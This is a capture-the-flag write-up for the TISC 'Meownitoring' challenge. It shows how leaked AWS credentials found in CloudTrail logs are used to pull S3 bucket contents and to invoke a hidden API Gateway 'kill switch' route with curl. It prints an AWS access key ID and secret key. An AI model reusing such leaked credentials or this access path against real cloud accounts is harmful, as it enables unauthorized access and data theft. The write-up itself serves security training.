# Level 6A: Meownitoring

## Description
>I guess their Trusted Platform Modules were not so trusted afterall. What about the cloud? It seems like the cloud is getting very secure nowadays. We've been getting some disruptions from the enemy again.
>
>The zip file was recovered from their servers! Seems like they are deploying some resources on the cloud. Your fellow agents heard something about a killswitch... We will need your help to identify the existence of the killswitch (if any), and activate it to stop the enemy's attack!
>
>Note: Concatenate flag1 and flag2 to form the flag for submission.
>
>Attached files:
>meownitoring.zip

## Solution
Prepare the files.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a]
└─$ unzip meownitoring.zip 
Archive:  meownitoring.zip
   creating: logs/
   creating: logs/prefix/
   creating: logs/prefix/AWSLogs/
   creating: logs/prefix/AWSLogs/637423240666/
   creating: logs/prefix/AWSLogs/637423240666/CloudTrail/
   creating: logs/prefix/AWSLogs/637423240666/CloudTrail/ap-southeast-1/
   creating: logs/prefix/AWSLogs/637423240666/CloudTrail/ap-southeast-1/2024/
   creating: logs/prefix/AWSLogs/637423240666/CloudTrail/ap-southeast-1/2024/07/
   creating: logs/prefix/AWSLogs/637423240666/CloudTrail/ap-southeast-1/2024/07/16/
  inflating: logs/prefix/AWSLogs/637423240666/CloudTrail/ap-southeast-1/2024/07/16/637423240666_CloudTrail_ap-southeast-1_20240716T0725Z_xhhTu7E0ddV4SwaQ.json.gz  
  inflating: logs/prefix/AWSLogs/637423240666/CloudTrail/ap-southeast-1/2024/07/16/637423240666_CloudTrail_ap-southeast-1_20240716T0725Z_yJt6vfyZgjwXrt5C.json.gz  
  inflating: notes.md

┌──(kali㉿kali)-[~/Desktop/level-6a]
└─$ cat notes.md            
# Workplan
Setup monitoring and logs analysis process for PALINDROME. 
Compare products (we have 1 beta testing rights, need to source for others)

## Product 1: Meownitoring (Beta Test)
`https://d231g4hz442ywp.cloudfront.net`

1. Any sensitive info in logs / monitoring? 
2. How secure is the setup?
3. Usefulness of dashboard? Buggy?
```

Visit https://d231g4hz442ywp.cloudfront.net and register for account.

![image](../images/104110c1eb13bbdb4dbbc556ee23ddfad7542b11fdc7551439ce428ba3292cf1.jpg)  

Read the onboarding guide from https://d231g4hz442ywp.cloudfront.net/dashboard/onboarding.html.

Prepare the logs.

```bash
┌──(kali㉿kali)-[~/…/ap-southeast-1/2024/07/16]
└─$ ls
637423240666_CloudTrail_ap-southeast-1_20240716T0725Z_xhhTu7E0ddV4SwaQ.json.gz  637423240666_CloudTrail_ap-southeast-1_20240716T0725Z_yJt6vfyZgjwXrt5C.json.gz

┌──(kali㉿kali)-[~/…/ap-southeast-1/2024/07/16]
└─$ gunzip *

┌──(kali㉿kali)-[~/…/ap-southeast-1/2024/07/16]
└─$ ls
637423240666_CloudTrail_ap-southeast-1_20240716T0725Z_xhhTu7E0ddV4SwaQ.json  637423240666_CloudTrail_ap-southeast-1_20240716T0725Z_yJt6vfyZgjwXrt5C.json
```

Reviewed the logs to find arn.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/logs]
└─$ find /home/kali/Desktop/level-6a/logs -name "*.json" -exec jq -r '.. | objects | select(.arn) | .arn' {} + | sort | uniq -c
     66 arn:aws:iam::637423240666:user/dev
```

Used `arn:aws:iam::637423240666:user/dev` and Export CloudTrail.

![image](../images/e0134f0ded07f7f379264ba931ac00358ae687d7b553da0d2267da7ff769e6f9.jpg)  

Prepare the files.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/Export]
└─$ unzip 637423240666.zip 
Archive:  637423240666.zip
---redacted---

┌──(kali㉿kali)-[~/Desktop/level-6a/Export/prefix]
└─$ tree .    
.
└── AWSLogs
---redacted

12 directories, 17 files
```

Search for more arn to be used.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/Export/prefix]
└─$ find . -name "*.gz" -exec gunzip {} \;

┌──(kali㉿kali)-[~/Desktop/level-6a/Export/prefix]
└─$ find . -name "*.json" -exec jq -r '.. | objects | select(.arn) | .arn' {} + | sort | uniq -c
      1 arn:aws:iam::637423240666:policy/debug_policy
      1 arn:aws:iam::637423240666:policy/iam_policy_for_compiler_role
      1 arn:aws:iam::637423240666:policy/iam-policy-for-meownitoring-role
      1 arn:aws:iam::637423240666:policy/iam-policy-for-meownitoring-role-test
      1 arn:aws:iam::637423240666:policy/iam_policy_for_processor_role
      1 arn:aws:iam::637423240666:role/compiler_lambda_role
      3 arn:aws:iam::637423240666:role/meownitoring-lambda-role
      1 arn:aws:iam::637423240666:role/mewonitoring-lambda-test
      1 arn:aws:iam::637423240666:role/processor_lambda_role
      1 arn:aws:iam::637423240666:user/debug
      1 arn:aws:iam::637423240666:user/deployer
    546 arn:aws:iam::637423240666:user/dev
      4 arn:aws:sts::637423240666:assumed-role/meownitoring-lambda-role/logsloader
```

Tested `arn:aws:iam::637423240666:role/meownitoring-lambda-role` and observed the following. Interesting to note that the `aws_secret_access_key` is redacted.

![image](../images/c581a610637e04b67dacff6c03f3e2ec5bf0dd91c65d37c12a80dfb5e3700e9f.jpg)  

Tested `arn:aws:iam::637423240666:role/mewonitoring-lambda-test` and observed the following. Interesting to note that `aws_secret_access_key` is `e+4awZv0dnDaFeIbuvKkccqhjuNOr9iUb+gx/TMe`.

![image](../images/67557c32951e7b17ad558cbe7ce778a9886927398cee0dc4dc824aaa2dc6d887.jpg)  

Searched the logs for possible `accessKeyId`.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/Export/prefix]
└─$ find . -name "*.json" -exec jq -r '.. | objects | select(.accessKeyId) | .accessKeyId' {} + | sort | uniq -c
    546 AKIAZI2LCYXNH4OISNEW
      1 AKIAZI2LCYXNH62RXRH7
      1 ASIAZI2LCYXNDG6XEY53
      1 ASIAZI2LCYXNJSRIMEOI
      4 ASIAZI2LCYXNOPXMZMU2
```

Identified the correct set of credentials. However, permissions were extremely restrictive.

```
AKIAZI2LCYXNH62RXRH7
e+4awZv0dnDaFeIbuvKkccqhjuNOr9iUb+gx/TMe
debug

┌──(kali㉿kali)-[~/Desktop/level-6a/Export/prefix]
└─$ aws configure                                                                                                                                                           
AWS Access Key ID [****************XRH7]: 
AWS Secret Access Key [****************/TMe]: 
Default region name [ap-southeast-1]: 
Default output format [json]:
```

Decided to look into s3 bucket activities.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/Export]
└─$ find . -name "*.json" -exec jq -r '.. | objects | select(.bucketName) | .bucketName' {} + | sort | uniq -c
     72 meownitoring2024trailbucket
     27 meownitoringtmpbucket
```

Download all files from the buckets.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/s3]
└─$ aws s3 sync s3://meownitoringtmpbucket .
download: s3://meownitoringtmpbucket/notes2.md to ./notes2.md   
download: s3://meownitoringtmpbucket/flag1.txt to ./flag1.txt   
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/level-6a/s3]
└─$ aws s3 sync s3://meownitoring2024trailbucket .
---redacted
```

Read `notes2.md` and `flag1.txt`.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/s3]
└─$ cat flag1.txt           
---redacted---
Here's a partial flag: TISC{m@ny_inf0_frOm_l0gs_

┌──(kali㉿kali)-[~/Desktop/level-6a/s3]
└─$ cat notes2.md  
# Item 1: Known issue with logs

Cloudtrail is not enabled prior to some deployments. However, it should have capture most events related to upcoming operations. 

Evaluation of Product 1: Meownitoring (Beta Test) 
- Doesn't seem to be able to process large amount of logs 
- TODO: read up on confused deputy problem.  

# Item 2: Kill switch mechanism 

Kill switch was introduced after EXERCISE-0x74697363 where operators had to terminate the attack on multiple systems manually, which is ineffective and inefficient.

Objective: 
- Develop a simple mechanism: upon invoke, terminates all attack 
- Put platform on "sleep" state?
- Rotate the kill switch randomly (i.e., id, stage, route, method), except during designated freeze period.

Upcoming platform freeze: 1 Sep - 30 Oct 2024 

TODO: Rotate kill switch before freeze period.
```

Prepare the files.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/s3/prefix]
└─$ tree .
.
└── AWSLogs
---redacted---

14 directories, 50 files
```

Searched for `functionName`.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/s3/prefix]
└─$ find . -name "*.gz" -exec gunzip {} \;

┌──(kali㉿kali)-[~/Desktop/level-6a/s3/prefix]
└─$ find . -name "*.json" -exec jq -r '.. | objects | select(.functionName) | .functionName' {} + | sort | uniq -c
     74 debug-logs-compiler
    102 processor
```

When investigating into `"eventName": "AddPermission20150331v2` associated with function `processor`, found something interesting.

```
---redacted---
            "eventTime": "2024-07-17T05:56:53Z",
            "eventSource": "lambda.amazonaws.com",
            "eventName": "AddPermission20150331v2",
            "awsRegion": "ap-southeast-1",
            "sourceIPAddress": "8.29.230.19",
            "userAgent": "APN/1.0 HashiCorp/1.0 Terraform/1.3.7 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/lambda#1.56.1",
            "requestParameters": {
                "functionName": "processor",
                "statementId": "AllowAPIInvoke",
                "action": "lambda:InvokeFunction",
                "principal": "apigateway.amazonaws.com",
                "sourceArn": "arn:aws:execute-api:ap-southeast-1::*"
            },
            "responseElements": {
                "statement": "{\"Sid\":\"AllowAPIInvoke\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:ap-southeast-1:637423240666:function:processor\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:ap-southeast-1::*\"}}}"
            },
---redacted---
```

Based on the [confused deputy](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html) hint, it is possible that the AWS API Gateway is able to invoke the function `processor`.

Read up on [Invoke REST APIs in API Gateway](https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html).

```
The base URL for REST APIs is in the following format:

  https://{apiId}.execute-api.{awsRegion}.amazonaws.com/{stageName}/
```

Checked for the parameters.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/s3/prefix]
└─$ find . -name "*.json" -exec jq -r '.. | objects | select(.apiId) | .apiId' {} + | sort | uniq -c
     19 9pyoiyr9pc
     78 f7x7yzf9j2
     45 kv0g2hke5e
    112 pxzfkfmjo7
     19 s14dfgslg5

┌──(kali㉿kali)-[~/Desktop/level-6a/s3/prefix]
└─$ find . -name "*.json" -exec jq -r '.. | objects | select(.awsRegion) | .awsRegion' {} + | sort | uniq -c
   1747 ap-southeast-1
    796 us-east-1

┌──(kali㉿kali)-[~/Desktop/level-6a/s3/prefix]
└─$ find . -name "*.json" -exec jq -r '.. | objects | select(.stageName) | .stageName' {} + | sort | uniq -c
      5 0a77303170a8bb6
      8 0c39562660b39d7
     19 27e53566ef
     12 371c9248920d
     17 5587y0s9d5aed
      5 70a8bb68621b85
      5 a58409179d77f55092fad
      5 a5845sa9179d
      5 e72daa021a6eadd

```

Searched for `routeKey`.

```bash
┌──(kali㉿kali)-[~/Desktop/level-6a/s3/prefix]
└─$ find . -name "*.json" -exec jq -r '.. | objects | select(.routeKey) | .routeKey' {} + | sort | uniq -c
      2 GET /9c3559e353d8ac1
      2 GET /asdsaczxc
      4 GET /befed460b973fe6bf
      2 GET /ca75e98961a4h85d9fc8
      3 GET /ca75e98961ab1fa5fc0a9fc8
      2 POST /23e9f9c3559e353d8ac1b7bd43191a6d850a97
      4 POST /3b83245a87a56ca8aca75e98961a
      4 POST /68fd47b8bf291eeea36480872f5ce29f0edb
      4 POST /6j3j97m36z1jsgf7x27e53566
      2 POST /6j3j97m36zl9x4b727e53566
```

Build the HTTP request using the most recent parameters found via keyword search on Visual Studio Code.

```bash
┌──(kali㉿kali)-[~/…/ap-southeast-1/2024/07/17]
└─$ curl -X POST "https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/5587y0s9d5aed/68fd47b8bf291eeea36480872f5ce29f0edb"                                                        
{"flag2": "&_me-0-wn1t0r1nNnG\\//[>^n^<]\\//}"}
```

## Flag
`TISC{m@ny_inf0_frOm_l0gs_&_me-0-wn1t0r1nNnG\\//[>^n^<]\\//}`